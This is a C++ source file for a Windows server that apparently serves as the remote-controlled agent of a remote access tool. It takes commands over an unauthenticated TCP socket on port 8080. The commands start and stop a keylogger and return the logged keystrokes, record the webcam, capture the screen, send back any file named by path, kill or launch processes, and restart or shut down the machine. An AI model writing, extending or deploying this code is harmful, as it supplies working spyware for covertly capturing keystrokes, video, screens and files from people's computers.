#include "server.h"
#include "include/ProcessManager.hpp"

#pragma comment(lib, "Ws2_32.lib")

WebcamRecorder recorder;

Server::Server(const std::string &port) : serverPort(port) {}

Server::~Server()
{
    if (this->clientCommunicationSocket != INVALID_SOCKET)
    {
        shutdown(this->clientCommunicationSocket, SD_SEND);
        closesocket(this->clientCommunicationSocket);
        this->clientCommunicationSocket = INVALID_SOCKET;
    }
    if (this->listenSocket != INVALID_SOCKET)
    {
        closesocket(this->listenSocket);
        this->listenSocket = INVALID_SOCKET;
    }
    WSACleanup();
    std::cout << "Server has stopped." << "\n";
}

void Server::Start()
{
    WSADATA wsaDataSvr;
    int iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaDataSvr);
    if (iResult != 0)
    {
        std::cerr << "Unable to initialize Winsock: " << iResult << "\n";
        return;
    }

    struct addrinfo *addrResult = NULL;
    struct addrinfo hintsSvr;

    ZeroMemory(&hintsSvr, sizeof(hintsSvr));
    hintsSvr.ai_family = AF_INET;       // IPv4
    hintsSvr.ai_socktype = SOCK_STREAM; // Stream socket (TCP)
    hintsSvr.ai_protocol = IPPROTO_TCP; // TCP protocol
    hintsSvr.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, this->serverPort.c_str(), &hintsSvr, &addrResult);
    if (iResult != 0)
    {
        std::cerr << "getaddrinfo failed: " << iResult << "\n";
        WSACleanup();
        return;
    }

    this->listenSocket = socket(addrResult->ai_family, addrResult->ai_socktype,
                                addrResult->ai_protocol);
    if (this->listenSocket == INVALID_SOCKET)
    {
        std::cerr << "Unable to create socket listener: " << WSAGetLastError()
                  << "\n";
        freeaddrinfo(addrResult);
        WSACleanup();
        return;
    }

    iResult = bind(this->listenSocket, addrResult->ai_addr,
                   (int)addrResult->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        std::cerr << "Unable to bind socket: " << WSAGetLastError() << "\n";
        freeaddrinfo(addrResult);
        closesocket(this->listenSocket);
        WSACleanup();
        return;
    }
    freeaddrinfo(addrResult);

    iResult = listen(this->listenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        std::cerr << "Unable to listen: " << WSAGetLastError() << "\n";
        closesocket(this->listenSocket);
        WSACleanup();
        return;
    }
    std::cout << "Server listening on port " << this->serverPort << "\n";
    this->isRunning = true;

    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    this->clientCommunicationSocket =
        accept(this->listenSocket, (sockaddr *)&clientAddr, &clientAddrSize);
    if (this->clientCommunicationSocket == INVALID_SOCKET)
    {
        std::cerr << "Unable to accept client connection: " << WSAGetLastError()
                  << "\n";
        closesocket(this->listenSocket);
        this->listenSocket = INVALID_SOCKET;
        WSACleanup();
        this->isRunning = false;
        return;
    }
    std::cout << "Client connected to server." << "\n";

    closesocket(this->listenSocket);
    this->listenSocket = INVALID_SOCKET;

    HandleClient();

    if (this->clientCommunicationSocket != INVALID_SOCKET)
    {
        iResult = shutdown(this->clientCommunicationSocket, SD_SEND);
        if (iResult == SOCKET_ERROR)
        {
            std::cerr << "Unable to shutdown client communication socket: "
                      << WSAGetLastError() << "\n";
        }
        closesocket(this->clientCommunicationSocket);
        this->clientCommunicationSocket = INVALID_SOCKET;
    }

    this->isRunning = false;
}

void Server::HandleClient()
{
    CommandType commandType;
    int iResult;

    do
    {
        iResult = recv(this->clientCommunicationSocket, (char *)&commandType,
                       sizeof(commandType), 0);
        if (iResult > 0)
        {
            int numArgs;
            recv(this->clientCommunicationSocket, (char *)&numArgs, sizeof(numArgs),
                 0);
            std::vector<std::string> args;
            for (int i = 0; i < numArgs; ++i)
            {
                int argSize;
                recv(this->clientCommunicationSocket, (char *)&argSize, sizeof(argSize),
                     0);
                std::vector<char> argBuffer(argSize);
                recv(this->clientCommunicationSocket, argBuffer.data(), argSize, 0);
                args.push_back(std::string(argBuffer.begin(), argBuffer.end()));
            }

            std::string stringResponse;
            std::vector<char> fileBufferResponse;

            switch (commandType)
            {
            case LIST_APPS:
                stringResponse = list_apps_windows();
                break;
            case LIST_PROCESSES:
                stringResponse = list_background_processes_windows();
                break;
            case START_APP:
                if (!args.empty())
                {
                    stringResponse = start_new_process_windows(args[0]);
                }
                else
                {
                    stringResponse = "ERROR: No app name provided.";
                }
                break;
            case STOP_APP:
                if (!args.empty())
                {
                    try
                    {
                        DWORD pid = std::stoul(args[0]);
                        stringResponse = terminate_process_by_pid_windows(pid);
                    }
                    catch (const std::exception &)
                    {
                        stringResponse = terminate_process_by_name_windows(args[0]);
                    }
                }
                else
                {
                    stringResponse = "ERROR: No app name or PID provided.";
                }
                break;
            case START_PROCESS:
                if (!args.empty())
                {
                    stringResponse = start_new_process_windows(args[0]);
                }
                else
                {
                    stringResponse = "ERROR: No process name provided.";
                }
                break;
            case STOP_PROCESS:
                if (!args.empty())
                {
                    try
                    {
                        DWORD pid = std::stoul(args[0]);
                        stringResponse = terminate_process_by_pid_windows(pid);
                    }
                    catch (const std::exception &)
                    {
                        stringResponse = terminate_process_by_name_windows(args[0]);
                    }
                }
                else
                {
                    stringResponse = "ERROR: No process name or PID provided.";
                }
                break;
            case START_KEYLOGGER:
                stringResponse = start_keylogger();
                break;
            case RESET_COMPUTER:
                stringResponse = restart_windows_system();
                break;
            case SHUTDOWN_COMPUTER:
                stringResponse = shutdown_windows_system();
                break;

            case START_WEBCAM: {
                recorder.startRecording("webcam_recording.avi", 0, 30.0, 640, 480);
                stringResponse = "success";
                break;
            }
            case STOP_KEYLOGGER:
            {
                std::string stop_result = stop_keylogger();
                if (stop_result.find("SUCCESS") != std::string::npos ||
                    stop_result.find("INFO: Keylogger is not running") !=
                        std::string::npos)
                {
                    std::string keylog_content = get_keylogs();
                    if (!keylog_content.empty() &&
                        keylog_content.find("ERROR") == std::string::npos)
                    {
                        stringResponse = "keylogger.txt";
                        std::ofstream temp_file(stringResponse);
                        if (temp_file.is_open())
                        {
                            temp_file << keylog_content;
                            temp_file.close();
                            std::ifstream file(stringResponse, std::ios::binary);
                            if (file)
                            {
                                fileBufferResponse.assign(
                                    (std::istreambuf_iterator<char>(file)),
                                    (std::istreambuf_iterator<char>()));
                            }
                            else
                            {
                                stringResponse = "failed: could not read keylog file";
                            }
                        }
                        else
                        {
                            stringResponse = "failed: could not create temp keylog file";
                        }
                    }
                    else
                    {
                        stringResponse = "failed: could not get keylog content";
                    }
                }
                else
                {
                    stringResponse = "failed: could not stop keylogger";
                }
                break;
            }

            case RETRIEVE_FILE:
            {
                if (args.empty())
                {
                    stringResponse = "failed: no file path provided";
                    break;
                }

                const std::string &filePath = args[0];
                DWORD attributes = GetFileAttributesA(filePath.c_str());

                if (attributes != INVALID_FILE_ATTRIBUTES &&
                    (attributes & FILE_ATTRIBUTE_DIRECTORY))
                {
                    stringResponse = "failed: path is a directory";
                    fileBufferResponse.clear();
                }
                else
                {
                    std::ifstream file(filePath, std::ios::binary);
                    if (file)
                    {
                        fileBufferResponse.assign((std::istreambuf_iterator<char>(file)),
                                                  (std::istreambuf_iterator<char>()));
                        size_t last_slash_idx = filePath.find_last_of("/\\");
                        if (std::string::npos != last_slash_idx)
                        {
                            stringResponse = filePath.substr(last_slash_idx + 1);
                        }
                        else
                        {
                            stringResponse = filePath;
                        }
                    }
                    else
                    {
                        stringResponse = "failed: could not open file";
                        fileBufferResponse.clear();
                    }
                }
                break;
            }

            case STOP_WEBCAM:
            {
                if (recorder.isRecording()) recorder.stopRecording();
                
                // stringResponse = "files/receive/webcam_recording.avi";
                stringResponse = "webcam_recording.avi";
                std::ifstream file(stringResponse, std::ios::binary);
                if (file)
                {
                    fileBufferResponse.assign((std::istreambuf_iterator<char>(file)),
                                              (std::istreambuf_iterator<char>()));
                }
                else
                {
                    stringResponse = "failed";
                }
                break;
            }
            case CAPTURE_SCREEN:
            {
                captureScreen();
                stringResponse = "screenshot.png";
                std::ifstream file(stringResponse, std::ios::binary);

                if (file)
                {
                    fileBufferResponse.assign((std::istreambuf_iterator<char>(file)),
                                              (std::istreambuf_iterator<char>()));
                }
                else
                {
                    stringResponse = "failed: could not capture screen";
                }
                break;
            }
        }

            int stringResponseSize = stringResponse.length();
            send(this->clientCommunicationSocket, (char *)&stringResponseSize,
                 sizeof(stringResponseSize), 0);
            if (stringResponseSize > 0)
            {
                send(this->clientCommunicationSocket, stringResponse.c_str(),
                     stringResponseSize, 0);
            }

            long long fileBufferSize = fileBufferResponse.size();
            send(this->clientCommunicationSocket, (char *)&fileBufferSize,
                 sizeof(fileBufferSize), 0);
            if (fileBufferSize > 0)
            {
                long long totalBytesSent = 0;
                int iResult;
                const int CHUNK_SIZE = 8192;
                while (totalBytesSent < fileBufferSize)
                {
                    long long remainingBytes = fileBufferSize - totalBytesSent;
                    int bytesToSend =
                        (remainingBytes < CHUNK_SIZE) ? (int)remainingBytes : CHUNK_SIZE;
                    iResult =
                        send(this->clientCommunicationSocket,
                             fileBufferResponse.data() + totalBytesSent, bytesToSend, 0);
                    if (iResult > 0)
                    {
                        totalBytesSent += iResult;
                        float progress = (float)totalBytesSent / fileBufferSize;
                        int barWidth = 50;
                        std::cout << "Sending [";
                        int pos = barWidth * progress;
                        for (int i = 0; i < barWidth; ++i)
                        {
                            if (i < pos)
                                std::cout << "=";
                            else if (i == pos)
                                std::cout << ">";
                            else
                                std::cout << " ";
                        }
                        std::cout << "] " << int(progress * 100.0) << " %\r";
                        std::cout.flush();
                    }
                    else
                    {
                        break;
                    }
                }
                std::cout << "\n";
            }
        }
        else if (iResult == 0)
        {
            std::cout << "Connection closed by client." << "\n";
        }
        else
        {
            std::cerr << "recv error: " << WSAGetLastError() << "\n";
        }
    } while (iResult > 0 && this->isRunning);
}

int main()
{
    Server server("8080");
    server.Start();
    return 0;
}